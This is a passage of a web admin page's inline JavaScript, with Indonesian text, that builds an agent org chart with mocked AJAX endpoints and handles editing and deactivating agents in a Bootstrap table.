                                                    semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': 'RESIGN', 'relationship': '100'});
                                                }
                                            }
                                        }
                                    }
                                }

                                function compare(a,b) {
                                  if (a.parent < b.parent)
                                    return -1;
                                  if (a.parent > b.parent)
                                    return 1;
                                  return 0;
                                };
                                semua.sort(compare);

                                for(var i =0; i<semua.length;i++){
                                    for(var j=0; j<semua.length;j++){
                                        if(semua[i].id == id && semua[j].parent == semua[i].id){
                                            anak.push(semua[j]);
                                        }
                                    }
                                }

                                for(var i = 0; i<semua.length;i++){
                                    cucu[i]=[];
                                    parentS.push(semua[i].parent);
                                    for(var j = 0; j<semua.length;j++){
                                        if(semua[i].id == semua[j].parent){
                                            cucu[i].push(semua[j]);
                                        }
                                    }
                                }

                                function cari(idP){
                                    for(var i =0; i<semua.length;i++){
                                        if(semua[i].id == idP){
                                            if(semua[i].parent == null){
                                                parent.push(semua[i].id);
                                                break;
                                            }
                                            parent.push(semua[i].id);
                                            cari(semua[i].parent);
                                        }
                                    }
                                }

                                cari(id);
                                
                                $.each(parent, function(i, el){
                                    if($.inArray(el, parentId) === -1) parentId.push(el);
                                });
                                $.each(parentS, function(i, el){
                                    if($.inArray(el, parentsId) === -1) parentsId.push(el);
                                });

                                for(var i=0; i<parentId.length;i++){
                                    sodara[i]=[];
                                    for(var j=0; j<semua.length;j++){
                                        if(parentId[i] == semua[j].parent){
                                            sodara[i].push(semua[j]);
                                        }
                                        if(parentId[i] == semua[j].id){
                                            kakek.push(semua[j]);
                                        }
                                    }
                                }

                                for(var i=0;i<parentId.length;i++){
                                    for(var j=0;j<sodara.length;j++){
                                        var obj = sodara;
                                        for(var k=0;k<sodara[j].length;k++){
                                            if(parentId[i].indexOf(obj[j][k].id) !== -1){
                                                sodara[j].splice(k,1);
                                                k--;
                                            }
                                        }
                                    }
                                }

                                for(var i=0; i<semua.length;i++){
                                    if(semua[i].id == id){
                                        orang.push(semua[i]);
                                    }
                                }

                                for(var i=0; i<kakek.length;i++){
                                    for(var j=0; j<cucu.length;j++){
                                        for(var k=0; k<cucu[j].length;k++){
                                            if(cucu[j][k].parent == kakek[i].id){
                                               $.mockjax({
                                                  url: '/orgchart/parent/'+cucu[j][k].id,
                                                  contentType: 'application/json',
                                                  responseTime: 1000,
                                                  responseText: { 'id': kakek[i].id,'name': kakek[i].name, 'title': kakek[i].title, 'relationship': kakek[i].relationship }
                                                }); 
                                            }
                                            
                                        }
                                    }
                                }

                                for(var i=0; i<parentId.length;i++){
                                    $.mockjax({
                                      url: '/orgchart/siblings/'+parentId[i],
                                      contentType: 'application/json',
                                      responseTime: 1000,
                                      responseText: { 'siblings': sodara[i+1]}
                                    });

                                    if(kakek[i+1] == null){
                                        break;
                                    }

                                    $.mockjax({
                                      url: '/orgchart/families/'+parentId[i],
                                      contentType: 'application/json',
                                      responseTime: 1000,
                                      responseText: {
                                        'id': kakek[i+1].id,
                                        'name': kakek[i+1].name,
                                        'title': kakek[i+1].title,
                                        'relationship': kakek[i+1].relationship,
                                        'children': sodara[i+1]}
                                    });
                                }

                                for(var i = 0; i<parentsId.length;i++){
                                    for(var j = 0; j<cucu.length;j++){
                                        for(var k = 0; k<cucu[j].length;k++){
                                            if(parentsId[i] == cucu[j][k].parent){
                                                $.mockjax({
                                                   url: '/orgchart/children/'+parentsId[i],
                                                   contentType: 'application/json',
                                                   responseTime: 1000,
                                                   responseText: { 'children': cucu[j]}
                                                });
                                            }
                                        }
                                    }
                                }

                                datascource = {
                                  'id': orang[0].id,
                                  'name': orang[0].name,
                                  'title': orang[0].title,
                                  'relationship': orang[0].relationship,
                                  'children': anak,
                                };
                                ajaxURLs = {
                                  'children': '/orgchart/children/',
                                  'parent': '/orgchart/parent/',
                                  'siblings': function(nodeData) {
                                    return '/orgchart/siblings/' + nodeData.id;
                                  },
                                  'families': function(nodeData) {
                                    return '/orgchart/families/' + nodeData.id;
                                  }
                                };

                                $('#chart-container').orgchart({
                                  'data' : datascource,
                                  'ajaxURL': ajaxURLs,
                                  'nodeContent': 'title',
                                  'nodeId': 'id'
                                });
                            }
                        });
                        
	                },
	                'click .edit': function (e, value, row, index) {
	                    info = JSON.stringify(row);
                        var coba = JSON.parse(info);
                        var nama = coba.nama;
                        var telp = coba.telp;
                        var idEdit = coba.actions;
                        var userid = "<?php echo $rowU['id']; ?>";

                        if(coba.actions == userid){
                            swal(
                              '',
                              'Maaf, user sedang digunakan seghingga tidak dapat diubah',
                              'warning'
                            )
                        }else{
                            $('#editModal').modal('show');
                            $('option').removeAttr("selected");
                            $('#jkId1').removeAttr("checked");
                            $('#jkId2').removeAttr("checked");
                            $.ajax({
                                url     : "info.php",
                                type    : "POST",
                                data    : {
                                        'editAgent': idEdit
                                    },
                                success:function(show)
                                {
                                    $("#idId").val(show.id);
                                    $("#namaId").val(show.nama);
                                    $("#telpId").val(show.no_telp);
                                    $('#jabatanId option[value="'+show.position_id+'"]').attr('selected', 'selected');
                                    $('#cabangId option[value="'+show.b_office_id+'"]').attr('selected', 'selected');
                                    $('#uplineId option[value="'+show.upline_id+'"]').attr('selected', 'selected');
                                    $("#tanggalId ").val(show.tgl_lahir);
                                    if(show.jenis_kelamin == "Laki-Laki"){
                                        $("#jkId1").attr('checked', 'checked');
                                    }else if(show.jenis_kelamin == "Perempuan"){
                                        $("#jkId2").attr('checked', 'checked');
                                    }
                                    if(show.aktif == '0'){
                                        $('#namaId').prop('disabled', true);
                                        $('#jabatanId').prop('disabled', true);
                                        $('#cabangId').prop('disabled', true);
                                        $('#telpId').prop('disabled', true);
                                    }else{
                                        $('#namaId').prop('disabled', false);
                                        $('#jabatanId').prop('disabled', false);
                                        $('#cabangId').prop('disabled', false);
                                        $('#telpId').prop('disabled', false);
                                    }
                                    
                                }
                            });
                        }

	                    


	                },
	                'click .remove': function (e, value, row, index) {
	                    
                        info = JSON.stringify(row);
                        var coba = JSON.parse(info);
                        var idRemove = coba.actions;
                        var userid = "<?php echo $rowU['id']; ?>";
                        if(coba.actions == userid){
                            swal(
                              '',
                              'Maaf, user sedang digunakan seghingga tidak dapat dihapus',
                              'warning'
                            )
                        }else{
                            if(coba.status == 'Non-Aktif'){
                                swal(
                                  '',
                                  'Maaf, Agen sudah di non-aktifkan sebelumnya',
                                  'warning'
                                )
                            }else if(coba.status == 'Aktif'){
                                swal({
                                  title: 'Anda yakin?',
                                  text: "Ingin meng-non aktifkan "+coba.nama+" ?",
                                  type: 'warning',
                                  showCancelButton: true,
                                  confirmButtonColor: '#3085d6',
                                  cancelButtonColor: '#d33',
                                  confirmButtonText: 'Ya, Hapus!',
                                  cancelButtonText: 'Tidak, Batal',
                                  confirmButtonClass: 'btn btn-success',
                                  cancelButtonClass: 'btn btn-danger',
                                  buttonsStyling: false
                                }).then(function () {
                                  $.ajax({
                                    url     : "../proses.php?cmd=hapus_user",
                                    type    : "POST",
                                    data    : {
                                            'id': idRemove
                                        },
                                    success:function(show)
                                    {
                                        
                                    }
                                  });

                                  $.ajax({
                                    url     : "../proses.php?cmd=non_aktif",
                                    type    : "POST",
                                    data    : {
                                            'id': idRemove
                                        },
                                    success:function(show)
                                    {
                                        swal(
                                            'Di-non Aktifkan!',
                                            coba.nama+' telah di-non aktifkan.',
                                            'success'
                                        ).then(function(){
                                            location.reload();
                                        }, function(dismiss){
                                            location.reload();
                                        });
                                        
                                    }
                                  });
                                }, function (dismiss) {
                                  // dismiss can be 'cancel', 'overlay',
                                  // 'close', and 'timer'
                                  if (dismiss === 'cancel') {
                                    swal(
                                      'Dibatalkan',
                                      'Anda telah membatalkan peng-non aktifan '+coba.nama,
                                      'error'
                                    );
                                  }
                                });
                            }
                        }
                        
	                }
	            };

	            $table.bootstrapTable({
	                toolbar: ".toolbar",
	                clickToSelect: true,
	                showRefresh: false,
	                search: true,
	                showToggle: true,
	                showColumns: true,
	                pagination: true,
	                searchAlign: 'left',
	                pageSize: 10,
	                clickToSelect: false,
	                pageList: [10,25,50,100],

	                formatShowingRows: function(pageFrom, pageTo, totalRows){
	                    //do nothing here, we don't want to show the text "showing x of y from..."
	                },
	                formatRecordsPerPage: function(pageNumber){
	                    return pageNumber + " rows visible";
	                },
	                icons: {
	                    refresh: 'fa fa-refresh',
	                    toggle: 'fa fa-th-list',
	                    columns: 'fa fa-columns',
	                    detailOpen: 'fa fa-plus-circle',
	                    detailClose: 'ti-close'
	                }
	            });

	            //activate the tooltips after the data table is initialized
	            $('[rel="tooltip"]').tooltip();

	            $(window).resize(function () {
	                $table.bootstrapTable('resetView');
	            });
			});

    </script>

</html>
